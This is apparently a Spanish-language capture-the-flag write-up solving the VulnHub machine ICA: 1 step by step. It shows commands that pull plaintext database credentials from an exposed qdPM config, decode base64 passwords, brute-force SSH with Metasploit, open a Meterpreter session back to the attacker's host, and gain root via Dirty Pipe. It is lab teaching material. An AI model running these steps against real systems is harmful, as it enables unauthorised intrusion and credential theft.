---
title: "Writeup ICA 1"
header:
  image: /assets/images/posts/ICA1/featured_image_ICA.jpg
  teaser: /assets/images/posts/ICA1/featured_image_ICA.jpg
excerpt_separator: "<!--more-->"
show_date: true
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - Vulnhub
tags:
  - searchsploit
  - mysql
  - base64
  - metasploit
  - scripts
collection: writeups
---


En este post te llevo paso a paso por la máquina ICA: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting, esta máquina nos reta a descubrir un misterioso proyecto secreto. ¿Listo para desentrañar los secretos de ICA?

## Descripción

Según la información de nuestra red de inteligencia, la ICA está trabajando en un proyecto secreto. Necesitamos descubrir de qué se trata. Una vez que obtengas la información de acceso, envíanosla. Colocaremos una puerta trasera para acceder al sistema más adelante. Tú solo concéntrate en descubrir en qué consiste el proyecto. Probablemente tendrás que atravesar varias capas de seguridad. La Agencia tiene plena confianza en que completarás esta misión con éxito. ¡Buena suerte, Agente!

## Resolucion de la maquina

![alt text](/assets/images/posts/ICA1/image.png)

### Fase de Fingerprinting / Reconocimiento (Reconnaissance):

#### Descubrimiento de IP objetivo en la red

![alt text](/assets/images/posts/ICA1/image-2.png)

![alt text](/assets/images/posts/ICA1/image-1.png)

#### Descubrimiento de puertos y servicios en el host objetivo

Realizo un descubrimiento de todos los puertos de la maquina objetivo.

```sh
nmap -p- 192.168.88.7 
```

Obtengo la siguiente lista de puertos de la maquina:

```sh
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

![alt text](/assets/images/posts/ICA1/image-3.png)

Realizo un escaneo con mas profundidad sobre los puertos detectados, buscando los servicios tras los puertos, asi como la ejecucion de scripts basicos para detectar vulnerabilidades y este resultado lo almacenare en diferentes formatos con nombre nmap_ICA

```sh
sudo nmap -p22,80,3306,33060 -sS -sC -sV -O 192.168.88.7 -oA nmap_ICA
```

Obtengo el siguiente resultado:

##### Puerto 22 - SSH

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
```

##### Puerto 80 - HTTP

```sh
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 (Debian)
```

##### Puerto 3306 - MYSQL

```sh
PORT      STATE SERVICE VERSION
3306/tcp  open  mysql   MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 42
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, FoundRows, LongPassword, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: T\x1E5H5\x11\x15\x14]`J{\x1CRW\x19\x0B\x1F[6
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
```

##### Puerto 33060 - MYSQLX

```sh
PORT      STATE SERVICE VERSION
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

##### Informacion General de la maquina.

```sh
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
```

### Fase de Footprinting / Exploración (Scanning):

#### Exploracion puerto 80

Realizo una exploracion visual mediante el navegador al puerto 80 de la ip de la maquina objetivo.

![alt text](/assets/images/posts/ICA1/image-4.png)

La pagina de acceso me da la bienvenida a un servicio llamado qdPM, ofreciendo un login. 

Veo que indica la versión 9.2 de qdPM. Voy a comprobar si esta version tiene vulnerabilidades conocidas mediante **searchsploit**

```sh
searchsploit qdPM 9.2
```

![alt text](/assets/images/posts/ICA1/image-6.png)

Copio el exploit a mi directorio de trabajo.

```sh
searchsploit -m 50176
```

![alt text](/assets/images/posts/ICA1/image-7.png)

Compruebo el exploit, para ver cuales son las instrucciones para usarlo.

```sh
cat 50176.txt
```

![alt text](/assets/images/posts/ICA1/image-8.png)

En las instrucciones me indican que la clave y la password de conexion a la base de datos esta guardada en un fichero de configuracion yml al que se puede acceder en una direccion web. 

Descargo el fichero usando la ruta de la URL en la maquina objetivo.

```sh
wget http://192.168.88.7/core/config/databases.yml
```

![alt text](/assets/images/posts/ICA1/image-9.png)

Compruebo el fichero descargado:

```sh
cat databases.yml
```

![alt text](/assets/images/posts/ICA1/image-10.png)

```sh
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true 
```

He obtenido credenciales para una base de datos en mysql llamada qdpm. 

#### Exploracion puerto 3306

Para realizar la enumeracion del puerto 3306 - MYSQL usaré modulos de  **metasploit**

##### Obtencion de la version de mysql

Uso el modulo auxiliar mysql_version. 

```sh
use auxiliary/scanner/mysql/mysql_version
options
setg RHOSTS 192.168.88.7
exploit
```

![alt text](/assets/images/posts/ICA1/image-14.png)

![alt text](/assets/images/posts/ICA1/image-15.png)

Obtengo que la version de MySQL que esta corriendo en la maquina es la 8.0.26.

##### Enumeracion de mysql

Usaré el modulo mysql_enum para enumerar el puerto 3306 y obtener usuarios y hashes de conntraseñas, mediante el uso de las credenciales descubierta en la enumeracion del puerto 80.

```sh
use auxiliary/admin/mysql/mysql_enum
set username qdpmadmin
set password UcVQCMQk2STVeS6J
exploit
```

![alt text](/assets/images/posts/ICA1/image-16.png)

##### Enumeracion de Esquema de las bases de datos.

Usare el modulo mysql_schemadump para obtener el esquema de las bases de datos del servidor mysql.

![alt text](/assets/images/posts/ICA1/image-18.png)

![alt text](/assets/images/posts/ICA1/image-17.png)

### Explotación

#### Explotacion puerto 3306

Para explotar el servicio de mysql me conecto al servicio con las credenciales obtenidas.

```sh
mysql -u qdpmadmin -p -h 192.168.88.7 -P 3306 
```

![alt text](/assets/images/posts/ICA1/image-11.png)

Compruebo cuales bases de datos existen.

```sql
SHOW DATABASES;
```

![alt text](/assets/images/posts/ICA1/image-12.png)

Accedo a la base de datos qdpm ya que supongo que sera la base de datos de la aplicacion web y podre obtener algun usuario.

```sql
USE qdpm
```

![alt text](/assets/images/posts/ICA1/image-19.png)

Compruebo las tablas que existen en la base de datos qdpm.

```sql
SHOW TABLES;
```

![alt text](/assets/images/posts/ICA1/image-20.png)

```sh
+----------------------+
| Tables_in_qdpm       |
+----------------------+
| attachments          |
| configuration        |
| departments          |
| discussions          |
| discussions_comments |
| discussions_reports  |
| discussions_status   |
...
| tickets              |
| tickets_comments     |
| tickets_reports      |
| tickets_status       |
| tickets_types        |
| user_reports         |
| users                |
| users_groups         |
| versions             |
| versions_status      |
+----------------------+
35 rows in set (0.005 sec)
```

La tabla users llama mi atencion y compruebo su contenido 

```sql
select * from users;
```

![alt text](/assets/images/posts/ICA1/image-37.png)

Esta consulta me indica que la base de datos esta vacia, por lo que cambio de base de datos qdpm a base de datos staff y consulto las tablas de las que dispone.

```sh
USE staff;
SHOW TABLES;
```

![alt text](/assets/images/posts/ICA1/image-26.png)

Consulto el contenido de la tabla `user`

```sql
select * from user;
```

![alt text](/assets/images/posts/ICA1/image-27.png)

Consulto el contenido de la tabla `department`

```sql
select * from department;
```

![alt text](/assets/images/posts/ICA1/image-38.png)

Consulto el contenido de la tabla `login`

```sql
select * from login;
```

![alt text](/assets/images/posts/ICA1/image-39.png)

En esta tabla vemos que existe un campo password. Observando los valores veo que parece que estan codificados en base64. 

Voy a unir las tablas user y login para obtener la relacion entre usuarios y claves. 

```sql
SELECT user.name AS nombre, login.password AS clave FROM user JOIN login ON user.id = login.user_id;
```

![alt text](/assets/images/posts/ICA1/image-41.png)

Como los valores de las claves estan en base64 puedo hacer la decodificacion directamente en SQL mediante la funcion `FROM_BASE64()`

```sql
SELECT user.name AS nombre, login.password AS clave, FROM_BASE64(login.password) AS decoded_password FROM user JOIN login ON user.id = login.user_id;
```

![alt text](/assets/images/posts/ICA1/image-42.png)

```txt
+---------+--------------------------+------------------+
| nombre  | clave                    | decoded_password |
+---------+--------------------------+------------------+
| Lucas   | c3VSSkFkR3dMcDhkeTNyRg== | suRJAdGwLp8dy3rF |
| Dexter  | N1p3VjRxdGc0MmNtVVhHWA== | 7ZwV4qtg42cmUXGX |
| Smith   | WDdNUWtQM1cyOWZld0hkQw== | X7MQkP3W29fewHdC |
| Travis  | REpjZVZ5OThXMjhZN3dMZw== | DJceVy98W28Y7wLg |
| Meyer   | Y3FObkJXQ0J5UzJEdUpTeQ== | cqNnBWCByS2DuJSy |
+---------+--------------------------+------------------+
```

Creo ficheros con los nombres y las claves descodificadas.

![alt text](/assets/images/posts/ICA1/image-46.png)

![alt text](/assets/images/posts/ICA1/image-33.png)

Voy a crear un fichero de nombres de usuario basandome en los nombres de las personas obtenida en la base de datos. 

Para esto creo un fichero de script en bash llamado `procesar_nombres.sh`. Este script se alimentará por parametros del fichero de nombres y en parametros tambien le diré cual sera el fichero de salida a generar.

El script usará los nombres del fichero para darme los mismos nombres tanto en mayusculas como en minusculas y escribira una linea con cada generacion de usuario.


![alt text](/assets/images/posts/ICA1/image-43.png)

El codigo del script es el siguiente:


```sh
#!/bin/bash

# Verificar que se han proporcionado los nombres de archivo de entrada y salida
if [ $# -lt 2 ]; then
    echo "Uso: $0 <archivo_entrada> <archivo_salida>"
    exit 1
fi

# Archivo de entrada y salida
archivo_entrada="$1"
archivo_salida="$2"

# Verificar si el archivo de entrada existe
if [ ! -f "$archivo_entrada" ]; then
    echo "Error: El archivo $archivo_entrada no existe."
    exit 1
fi

# Registrar el tiempo de inicio en milisegundos
inicio=$(date +%s%3N)

# Limpiar o crear el archivo de salida
> "$archivo_salida"

# Leer cada nombre del archivo de entrada
while read -r nombre || [[ -n "$nombre" ]]; do
    # Convertir a mayúsculas y minúsculas
    mayusculas=$(echo "$nombre" | tr '[:lower:]' '[:upper:]')
    minusculas=$(echo "$nombre" | tr '[:upper:]' '[:lower:]')

    # Escribir cada variante en una línea separada en el archivo de salida
    echo "$nombre" >> "$archivo_salida"
    echo "$mayusculas" >> "$archivo_salida"
    echo "$minusculas" >> "$archivo_salida"
done < "$archivo_entrada"

# Calcular tiempo de finalización en milisegundos
fin=$(date +%s%3N)
duracion=$((fin - inicio))

# Contar las palabras generadas en el archivo de salida
palabras=$(wc -l < "$archivo_salida")

# Mostrar estadísticas
echo "Procesamiento completo."
echo "Resultados guardados en $archivo_salida"
echo "Palabras generadas: $palabras"
echo "Tiempo de ejecución: ${duracion} milisegundos"
```

Una vez creado el script lo guardo y compruebo sus permisos de ejecucion

ls -l procesar_nombres.sh

![alt text](/assets/images/posts/ICA1/image-44.png)

chmod +x procesar_nombres.sh

![alt text](/assets/images/posts/ICA1/image-45.png)

Ahora ejecuto el script creado pasandole como parametros el fichero de nombres que cree y dandole un archivo de salida.

```sh
procesar_nombres.sh nombres.txt usuarios.txt
```

![alt text](/assets/images/posts/ICA1/image-47.png)

Compruebo su contenido para verificar que es lo esperado.

![alt text](/assets/images/posts/ICA1/image-48.png)

#### Explotacion del servicio SSH

Con la lista de usuarios generada voy a intentar usarlas para obtener acceso al sistema mediante el servicio SSH. 

Para ello usare el modulo ssh_login de metasploit que me permite hacer fuerza bruta al servicio con los ficheros de usuario y claves que tengo.

```bash
msfconsole -q
search ssh_login
use auxiliary/scanner/ssh/ssh_login
```

![alt text](/assets/images/posts/ICA1/image-49.png)

```sh
set PASS_FILE pass.txt
set USER_FILE usuarios.txt
set verbose true
exploit
```

![alt text](/assets/images/posts/ICA1/image-50.png)

Espero que se ejecute el ataque. En los resultados veo que se consiguen dos sesiones ssh al servidor, una con el usuario `dexter` y otra con el usuario `travis`.

![alt text](/assets/images/posts/ICA1/image-51.png)

![alt text](/assets/images/posts/ICA1/image-52.png)

Puedo consultar las sesiones abiertas con el comando `sessions`

![alt text](/assets/images/posts/ICA1/image-53.png)

![alt text](/assets/images/posts/ICA1/image-55.png)

Voy a upgradear la sesion 1 a una sesion de meterpreter para poder usar mas adelante modulos de enumeracion en la maquina objetivo.

Para esto uso el modulo `shell_to_meterpreter`

```sh
use post/multi/manage/shell_to_meterpreter
```

![alt text](/assets/images/posts/ICA1/image-56.png)

Defino la sesion 1 y la IP para el localhost contra la que devolvera la sesion de meterpreter.

```sh
set session 1
set LhOST 192.168.88.3
```

![alt text](/assets/images/posts/ICA1/image-57.png)

Lanzo el modulo con el comando `exploit`

![alt text](/assets/images/posts/ICA1/image-58.png)

Compruebo con el comando `sessions` que tengo una session 3 de tipo meterpreter 

![alt text](/assets/images/posts/ICA1/image-59.png)

abro la session 3 de forma interactiva.

```sh
sessions -i 3
```

![alt text](/assets/images/posts/ICA1/image-60.png)

### Enumeracion local del sistema 

Ahora que he comprobado que tengo acceso a la session 3 mediante meterpreter, voy a pasarla de nuevo al background para hacer la enumeracion mediante modulos de metasploit.

```sh
background
```

![alt text](/assets/images/posts/ICA1/image-61.png)

#### Enumeracion local de la red en la maquina objetivo.

Para la enumeracion local de la red en la maquina objetivo voy a usar el **modulo de postexplotacion enum_network**

```sh
use post/linux/gather/enum_network
```

Compruebo las opciones requeridas para lanzarlo con el comando `options`

![alt text](/assets/images/posts/ICA1/image-66.png)

Ejecuto con `run` el modulo y comienza a hacer la enumeracion volcando la informacion en unos ficheros dentro de la carpeta **`/home/kali/.msf4/loot/`**

![alt text](/assets/images/posts/ICA1/image-67.png)

Los ficheros que obtengo son los siguientes:

| Configuracion        | fichero acabado en...       |
| -------------------- | --------------------------- |
| Network config       | linux.enum.netwo_435546.txt |
| Route table          | linux.enum.netwo_728552.txt |
| DNS config           | linux.enum.netwo_338080.txt |
| SSHD config          | linux.enum.netwo_975563.txt |
| Host file            | linux.enum.netwo_840574.txt |
| Active connections   | linux.enum.netwo_615940.txt |
| Wireless information | linux.enum.netwo_542351.txt |
| Listening ports      | linux.enum.netwo_207902.txt |
| If-Up/If-Down        | linux.enum.netwo_951546.txt |

![alt text](/assets/images/posts/ICA1/image-68.png)

Podemos consultar el contenido de ellos con el comando `cat`. Por ejemplo si quisiera ver el resultado de la enumeracion de la configuracion de red usaria:

```sh
cat 20241201065015_default_192.168.88.7_linux.enum.netwo_435546.txt
```

![alt text](/assets/images/posts/ICA1/image-69.png)

#### Enumeracion local de la configuraciones en la maquina objetivo.

Para ello usare el modulo:

```sh
use post/linux/gather/enum_configs
```

![alt text](/assets/images/posts/ICA1/image-64.png)

Obtenemos la siguiente informacion que se almacena en ficheros.

| Configuracion        | fichero acabado en...      |
| -------------------- | -------------------------- |
| apache2.conf         | linux.enum.conf_820557.txt |
| ports.conf           | linux.enum.conf_421813.txt |
| my.cnf               | linux.enum.conf_913290.txt |
| shells               | linux.enum.conf_703254.txt |
| sepermit.conf        | linux.enum.conf_986293.txt |
| ca-certificates.conf | linux.enum.conf_507790.txt |
| access.conf          | linux.enum.conf_140621.txt |
| rpc                  | linux.enum.conf_176857.txt |
| logrotate.conf       | linux.enum.conf_908148.txt |
| ldap.conf            | linux.enum.conf_313793.txt |
| sysctl.conf          | linux.enum.conf_398036.txt |

![alt text](/assets/images/posts/ICA1/image-65.png)


#### Enumeracion local de informacion del sistema en la maquina objetivo.

Para esta enumeracion utilizaré:

```sh
use post/linux/gather/enum_system
```

![alt text](/assets/images/posts/ICA1/image-70.png)


![alt text](/assets/images/posts/ICA1/image-71.png)

| Configuracion       | fichero acabado en...       |
| ------------------- | --------------------------- |
| Linux version       | linux.enum.syste_288009.txt |
| User accounts       | linux.enum.syste_160341.txt |
| Installed Packages  | linux.enum.syste_775955.txt |
| Running Services    | linux.enum.syste_388500.txt |
| Cron jobs           | linux.enum.syste_686066.txt |
| Disk info           | linux.enum.syste_803251.txt |
| Logfiles            | linux.enum.syste_298740.txt |
| Setuid/setgid files | linux.enum.syste_899019.txt |
| CPU Vulnerabilities | linux.enum.syste_831385.txt |

Obtengo los siguientes ficheros:

![alt text](/assets/images/posts/ICA1/image-72.png)

Compruebo si existen trabajos cron del usuario con el que enumero.

![alt text](/assets/images/posts/ICA1/image-73.png)

### Elevacion de privilegios

Para comprobar que vulnerabilidades puedo explotar en la maquina objetivo una vez que tengo acceso a ella con una sesion de meterpreter puedo usar el modulo **`local_exploit_suggester`**.

Indicaré que sesion de meterpreter quiero usar y lo ejecutaré.

```sh
use post/multi/recon/local_exploit_suggester
set session 3
exploit
```

![alt text](/assets/images/posts/ICA1/image-76.png)

Espero que termine la comprobacion de vulnerabilidades.

![alt text](/assets/images/posts/ICA1/image-77.png)

Obtengo la siguiente tabla de vulnerabilidades disponibles para probar que pueden tener bastante exito.

```txt

#   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0                                                    
 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.31-13) found on the target appears to be vulnerable              
 3   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.                                                                                       
 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.                                                                                       
 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module                

```

Comenzaré probando la vulnerabilidad `cve_2022_0847_dirtypipe`


En primer lugar me informo de la vulnerabilidad:

```sh
info exploit/linux/local/cve_2022_0847_dirtypipe  
```

![alt text](/assets/images/posts/ICA1/image-80.png)

![alt text](/assets/images/posts/ICA1/image-81.png)

Defino la session a usar, la ip de mi maquina atacante y un puerto libre de mi maquina

```sh
set session 3
set LHOST 192.168.88.3
set LPORT 7331
```

![alt text](/assets/images/posts/ICA1/image-82.png)

Compruebo que todo esta en orden con el comando `options`

![alt text](/assets/images/posts/ICA1/image-83.png)

Ejecuto el exploit obteniendo una sesion de meterpreter.

![alt text](/assets/images/posts/ICA1/image-84.png)

Compruebo en esta sesion de meterpreter que usuario soy y me da que soy root en la maquina objetivo.



![alt text](/assets/images/posts/ICA1/image-85.png)

Abro una shell desde meterpreter, y compruebo el contenido de la carpeta **`/root`** y consulto la flag root.txt

![alt text](/assets/images/posts/ICA1/image-86.png)

Con esto queda resuelta la maquina.
